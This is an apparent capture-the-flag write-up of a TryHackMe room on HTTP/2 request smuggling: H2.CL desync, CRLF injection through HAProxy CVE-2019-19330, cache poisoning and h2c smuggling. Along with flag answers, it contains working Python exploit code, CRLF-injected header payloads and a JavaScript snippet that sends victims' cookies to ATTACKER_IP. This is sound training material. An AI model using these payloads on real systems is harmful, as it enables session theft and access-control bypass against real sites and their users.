---
title: "TryHackMe HTTP/2 Request Smuggling: CRLF injection and cache poisoning"
date: 2026-10-22T15:56:00+05:30
lastmod: 2026-10-22T15:56:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-h2smuggling/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - HTTP/2
  - request smuggling
  - CRLF injection
  - CVE-2019-19330
  - web cache poisoning
  - h2c smuggling
  - HPACK
  - web application pentesting

draft: false
description: "TryHackMe HTTP/2 Request Smuggling walkthrough: H2.CL desync, CVE-2019-19330 CRLF injection via literal HPACK encoding, web cache poisoning, and h2c smuggling."
---

| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|---|---|
|HTTP/2 Request Smuggling |![HTTP/2 Request Smuggling room icon](https://cdn-images.tryhackme.com/room-icons/0e5ada0b18268959026e492c74b9f9b0.svg)|

This medium-difficulty room covers HTTP request smuggling in HTTP/2 environments: how HTTP/2 downgrading reintroduces desync conditions, how CVE-2019-19330 enables CRLF injection through literal HPACK encoding in HAProxy, and how h2c upgrades bypass proxy restrictions entirely. It builds on the [HTTP/1.1 Request Smuggling walkthrough](/post/thm-room-httprequestsmuggling/) and completes the smuggling track before the WebSockets smuggling room.

## Task 1: Introduction

Lab setup. The room deploys a target machine with multiple services on different ports: Varnish on port 8000 (H2.CL desync), HAProxy on port 8100 (CRLF injection and tunneling), and HAProxy on port 8200 (h2c smuggling). All practical tasks require constructing raw HTTP/2 frames or using specialized tooling because standard HTTP libraries enforce protocol constraints that the attacks depend on violating.

## Task 2: HTTP/2 Explained

HTTP/1.1 is a text-based protocol. Headers are separated by `\r\n` (carriage return, line feed), and the boundary between headers and body is a blank line (`\r\n\r\n`). The server reads the raw byte stream and parses these delimiters to determine where one request ends and the next begins.

HTTP/2 replaces text framing with binary framing. Each request is a stream of typed frames (HEADERS, DATA, CONTINUATION), and each frame carries an explicit length field. The protocol no longer relies on `\r\n` to separate headers or on `Content-Length` / `Transfer-Encoding` to delimit the body, because the binary frame structure defines boundaries unambiguously. Headers are compressed using HPACK, which encodes header name/value pairs into a compact binary representation.

The security implication: when an HTTP/2 frontend proxy downgrades requests to HTTP/1.1 for the backend, it must reconstruct the text-based format from the binary frames. If the proxy passes through headers or values that violate HTTP/1.1 syntax (like a Content-Length that contradicts the actual body, or header values containing `\r\n`), the backend's text parser can be tricked into seeing request boundaries that the frontend never intended.

### Answers

- **Which version of the HTTP protocol uses \r\n to separate headers in a request?** **HTTP/1.1**
- **Which version of the HTTP protocol uses a binary format and clearly defines boundaries between requests?** **HTTP/2**

## Task 3: H2.CL Desync

HTTP/2 does not use Content-Length to determine the body size (binary framing handles that), but nothing prevents a client from including a Content-Length header in an HTTP/2 request. When the frontend proxy downgrades to HTTP/1.1, it passes this header through to the backend. If the Content-Length value does not match the actual body length, the backend reads fewer bytes than the frontend forwarded, and the leftover bytes sit in the TCP buffer as the start of a new request.

The lab runs Varnish as the HTTP/2 frontend on port 8000. The backend is an HTTP/1.1 web server. The attack sends an HTTP/2 request with `content-length: 0` and a body containing a smuggled GET request. Varnish forwards the entire body to the backend connection. The backend reads Content-Length: 0 bytes (nothing), treats the request as complete, and interprets the remaining bytes as a new request.

The smuggled request targets `GET /post/like/12315198742342`, which triggers a like action on a specific post. A Python script using the h2 library sends the crafted request:

```python
import h2.connection, h2.config, ssl, socket

TARGET = "TARGET_IP"
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
ctx.set_alpn_protocols(["h2"])
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

sock = socket.create_connection((TARGET, 8000))
sock = ctx.wrap_socket(sock, server_hostname=TARGET)

conf = h2.config.H2Configuration(client_side=True)
conn = h2.connection.H2Connection(config=conf)
conn.initiate_connection()
sock.sendall(conn.data_to_send())

smuggled = b"GET /post/like/12315198742342 HTTP/1.1\r\nX: f"
headers = [
    (":method", "POST"), (":path", "/hello"),
    (":scheme", "https"), (":authority", f"{TARGET}:8000"),
    ("content-length", "0"),
]
conn.send_headers(1, headers)
conn.send_data(1, smuggled, end_stream=True)
sock.sendall(conn.data_to_send())
```

The smuggled body has no trailing `\r\n\r\n` and ends with `X: f` to absorb the next request's first line into a junk header, preventing a parse error.

### Answers

- **What is the username of the victim user who liked our post?** **THM{my_name_is_a_flag}**

{{< ad >}}

## Task 4: HTTP/2 Request Tunneling

Request tunneling is a variant of request smuggling where the smuggled request travels only on the attacker's own backend connection, not on a shared connection pool. When the frontend assigns each HTTP/2 connection its own backend connection (rather than multiplexing streams across a shared pool), the smuggled request affects only the attacker's subsequent requests on that same connection.

This is less powerful than full desync (you cannot poison other users' requests), but it still allows leaking internal headers, bypassing frontend restrictions, and poisoning caches if the proxy caches responses from the backend.

The lab uses HAProxy as the frontend proxy on port 8100 with CVE-2019-19330: a CRLF injection vulnerability in HTTP/2 header processing. HAProxy checks for `\r\n` sequences in header values to prevent injection, but only when the HPACK encoding uses Huffman compression. Headers encoded as literal (non-Huffman) byte strings bypass the check entirely. The injected `\r\n` sequences survive the HTTP/2 to HTTP/1.1 downgrade and appear as real line breaks in the backend's text parser.

To exploit this, the attacker must construct raw HTTP/2 frames with literal HPACK encoding instead of using an HTTP library (which defaults to Huffman). The helper functions for building raw frames:

```python
import struct

def build_frame(ftype, flags, sid, payload):
    return struct.pack('>I', len(payload))[1:] + \
           struct.pack('>BBi', ftype, flags, sid & 0x7FFFFFFF) + payload

def encode_int(value, prefix_bits):
    max_first = (1 << prefix_bits) - 1
    if value < max_first:
        return bytes([value])
    result = bytes([max_first])
    value -= max_first
    while value >= 128:
        result += bytes([0x80 | (value & 0x7F)])
        value >>= 7
    result += bytes([value])
    return result

def literal_header(name, value):
    data = bytes([0x00])
    data += encode_int(len(name), 7) + name
    data += encode_int(len(value), 7) + value
    return data
```

### Answers

- No answer needed.

## Task 5: Leaking Internal Headers

Frontend proxies often inject internal headers (client IP, authentication status, internal routing flags) before forwarding to the backend. These headers are invisible to the client but influence backend behavior. Request tunneling can leak them by smuggling a POST request with a large Content-Length and an open parameter that captures the next request's headers.

The backend application on port 8100 has a search endpoint at `/hello` that reflects the `q` POST parameter in its response. The CRLF-injected `foo` header smuggles a complete POST request to `/hello` with `Content-Length: 100` and a body ending with `q=`. When the backend processes the smuggled POST, it waits for 100 bytes of body data. The next legitimate request on that connection (a GET from the attacker's own stream) gets appended to the `q=` value, and the response reflects all the internal headers that HAProxy injected.

The raw HTTP/2 frame sends a `foo` header with this value (CRLF-injected, literal encoding):

```
bar\r\n
Content-Length: 0\r\n
\r\n
POST /hello HTTP/1.1\r\n
Host: TARGET:8100\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 100\r\n
\r\n
q=
```

The backend processes two requests from the single HTTP/2 stream: the original request (terminated by the injected `Content-Length: 0`), and the smuggled POST (which captures the next request). The response to the smuggled POST contains the leaked internal header `x-thm-flag`.

### Answers

- **What's the value of the leaked internal header?** **THM{not_secret_anymore}**

## Task 6: Bypassing Frontend Restrictions

HAProxy is configured to block direct access to `/admin` with a 403 Forbidden response. The restriction applies only to the frontend: the backend serves `/admin` to any request that reaches it. CRLF injection bypasses this by sending a benign request to `/hello` (which passes the frontend check) while smuggling a `GET /admin` in the injected headers.

The `foo` header value for this attack:

```
bar\r\n
Content-Length: 0\r\n
\r\n
GET /admin HTTP/1.1\r\n
Host: TARGET:8100\r\n
X: f
```

The frontend sees a POST to `/hello` and forwards it. The backend parses the CRLF injection, processes the original request (terminated by `Content-Length: 0`), then finds the smuggled `GET /admin` in the buffer and serves the admin page. The response contains the flag.

### Answers

- **What is the value of the flag in /admin?** **THM{staff_only}**

## Task 7: Web Cache Poisoning via Backend Pool

Web cache poisoning through request tunneling works by exploiting backend connection pool reuse. The attacker's CRLF-injected request smuggles a GET for a resource (like `/static/uploads/myjs.js`) whose response gets queued in the backend TCP buffer. When HAProxy reuses that same backend connection for a different frontend request (asking for `/static/text.js`), the backend serves the queued response for `myjs.js` instead. HAProxy caches this response under the URL `/static/text.js`, and every subsequent visitor who loads `/static/text.js` gets the attacker's JavaScript.

The attack requires several pieces to align:

1. Upload a malicious JavaScript file to `/static/uploads/myjs.js` via the application's upload feature. The JS payload steals cookies by sending them to an attacker-controlled HTTPS listener.

2. Send a poison request: a CRLF-injected GET to `/static/text.js` that smuggles a second `GET /static/uploads/myjs.js`. Both the poison and trigger requests must include `pragma: no-cache` to force HAProxy to bypass its read cache and forward to the backend.

3. Send a trigger request on a separate HTTP/2 connection: a clean GET to `/static/text.js` with `pragma: no-cache`. If HAProxy reuses the same backend connection that has the queued `myjs.js` response, the trigger gets the malicious content, and HAProxy caches it.

4. The pool reuse is probabilistic (the trigger must land on the same backend connection as the poison). Interleaving poison/trigger pairs across multiple attempts typically succeeds within 3 to 5 pairs.

The JavaScript payload uploaded to `/static/uploads/myjs.js`:

```javascript
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
  if (this.readyState == 4 && this.status == 200) {
    document.getElementById("demo").innerHTML = xhttp.responseText;
  }
};
xhttp.open("GET", "https://ATTACKER_IP:8002/?c="+document.cookie, true);
xhttp.send();
```

When a victim visits the main page, the browser loads the cached (poisoned) `/static/text.js`, which executes the attacker's code and exfiltrates the victim's cookies to the HTTPS listener.

### Answers

- **What is the value of the cookie stolen using web cache poisoning?** **THM{nom_nom_cookies}**

## Task 8: h2c Smuggling

h2c (HTTP/2 cleartext) is the unencrypted variant of HTTP/2. While h2 (HTTP/2 over TLS) uses ALPN negotiation during the TLS handshake, h2c uses an HTTP/1.1 Upgrade mechanism: the client sends a regular HTTP/1.1 request with `Connection: Upgrade, HTTP2-Settings`, `Upgrade: h2c`, and an `HTTP2-Settings` header. If the server supports h2c, it responds with `101 Switching Protocols` and the connection upgrades to HTTP/2.

The security issue arises when a frontend proxy allows the h2c upgrade to pass through to the backend. After the upgrade, the connection speaks HTTP/2 directly to the backend, completely bypassing any HTTP/1.1 path restrictions enforced by the proxy. The proxy sees only the initial upgrade request (which targets an allowed path like `/`), but all subsequent HTTP/2 requests on the upgraded connection go directly to the backend without frontend inspection.

The lab has HAProxy on port 8200 blocking access to `/private`. BishopFox's h2csmuggler automates the exploit: it sends the h2c upgrade request to `/` (which is allowed), then sends an HTTP/2 GET to `/private` over the upgraded connection:

```bash
python3 h2csmuggler.py -x https://TARGET:8200/ https://TARGET:8200/private
  # [+] h2c stream established successfully.
  # :status: 200
  # ...
  # [DATA] THM{walls_are_a_suggestion}
```

### Answers

- **What's the value of the flag on /private?** **THM{walls_are_a_suggestion}**

## Task 9: Conclusion

Room complete.

## Takeaways

**HPACK encoding choice is a security boundary, and HAProxy's CVE-2019-19330 proves it.** HAProxy's CRLF check only inspected Huffman-encoded header values, not literal byte strings. The assumption was that HTTP/2 libraries always use Huffman encoding (which is true for the standard Python h2 library and most browsers). But nothing in the HTTP/2 specification requires Huffman encoding; literal encoding is equally valid. An attacker who constructs raw HTTP/2 frames with literal HPACK encoding bypasses the check entirely, injecting `\r\n` sequences that survive the HTTP/2 to HTTP/1.1 downgrade and appear as real header separators to the backend. The lesson generalizes: any security check that relies on one encoding path being "always used" fails when the attacker controls the encoding. Protocol-level input validation must cover all valid representations, not just the common ones.

**Web cache poisoning through backend connection pool reuse turns a per-user tunneling primitive into a site-wide attack.** Request tunneling alone is limited: the smuggled request affects only the attacker's own backend connection, so it cannot directly intercept other users' requests. But when the frontend caches backend responses, the attacker does not need to intercept requests at all. The attacker poisons one backend connection with a queued malicious response, a trigger request on a separate connection hits the same pooled backend connection and receives the queued response, and the frontend caches that response under a legitimate URL. From that point forward, every user who requests that URL gets the attacker's content, served from the cache without ever touching the backend again. The probabilistic nature of pool reuse (only some trigger requests hit the poisoned connection) is not a defence; it just means the attacker needs to send a handful of attempts.

Room solved 100%: 9 tasks, 9 answers.
